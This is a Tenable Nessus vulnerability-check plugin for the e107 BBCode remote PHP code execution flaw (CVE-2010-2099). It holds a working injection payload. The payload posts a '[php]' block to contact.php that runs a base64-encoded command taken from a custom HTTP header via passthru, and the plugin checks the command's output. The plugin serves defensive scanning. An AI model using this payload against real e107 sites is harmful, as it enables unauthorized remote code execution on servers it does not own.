#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46692);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/11/11 20:08:42 $");

  script_cve_id("CVE-2010-2099");
  script_bugtraq_id(40252);
  script_osvdb_id(65243);
  script_xref(name:"Secunia", value:"39498");

  script_name(english:"e107 BBCode Arbitrary PHP Code Execution");
  script_summary(english:"Attempts to execute arbitrary PHP code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that allows arbitrary
code execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The installation of e107 on the remote host allows unauthenticated
access to the special '[php]' BBCode, which supports execution of
arbitrary PHP code.

An unauthenticated, remote attacker can leverage this to execute
arbitrary PHP, subject to the privileges under which the web server
operates."
  );
  # http://www.php-security.org/2010/05/19/mops-2010-035-e107-bbcode-remote-php-code-execution-vulnerability/index.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8d738c9e");
  # http://e107.svn.sourceforge.net/viewvc/e107/trunk/e107_0.7/e107_files/bbcode/php.bb?annotate=11544&pathrev=11544
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?503f4a45");
  script_set_attribute(attribute:"solution", value:"Disable support for BBCode or upgrade to version 0.7.21 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"e107 0.7.20 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/05/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/e107");
  script_require_ports("Services/www", 80);

  exit(0);
}
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);
dir = install['dir'];
url = dir + '/contact.php';
install_url = build_url(qs:dir, port:port);

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (res[0] =~ "404 Not Found")
  exit(0, "The 'contact.php' script was not found on the e107 install at " +
    install_url + "/.");
if (
  ("<div class='main_caption'>Contact Details</div>" >!< res[2]) &&
  ("<input class='tbox login user' type='text' name='username'" >!< res[2]) &&
  ("<input class='tbox login pass' type='password' name='userpass'" >!< res[2])
) exit(0, install_url + '/contact.php' + ' does not contain the expected contents.');

# Define some variables
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >!< os) cmd = "id";
  else cmd = "ipconfig /all";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Windows IP Configuration";

magic = SCRIPT_NAME + '-' + unixtime();
nesstr = "NESSUS2_" + toupper(rand_str());
exploit = '[php]echo("'+magic+'");passthru(base64_decode($_SERVER[HTTP_' + nesstr + ']));die();[/php]';

# Try to inject PHP code.
foreach cmd (cmds)
{
  postdata = 'send-contactus=1&author_name='+exploit;

  res = http_send_recv3(
    port        : port,
    method      : "POST",
    item        : url,
    data        : postdata,
    add_headers : make_array("Content-Type","application/x-www-form-urlencoded",
      nesstr, base64(str:cmd)),
    exit_on_fail : TRUE
  );

  # There's a problem if we see the expected command output.
  if (
    magic >< res[2] &&
    egrep(pattern:cmd_pats[cmd], string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      snip = crap(data:'-', length:30)+' snip '+crap(data:'-', length:30)+'\n';
      report =
        '\n' +
        "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
        'host using the following request :\n' +
        '\n' + snip +
        http_last_sent_request() +
        '\n' + snip;
      if (report_verbosity > 1)
      {
	  output = strstr(res[2], magic) - magic;
	  report +=
	    '\n' +
	    'This produced the following output :' +
	    '\n' + snip +
	    '\n' + chomp(output) +
	    '\n' + snip ;
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);
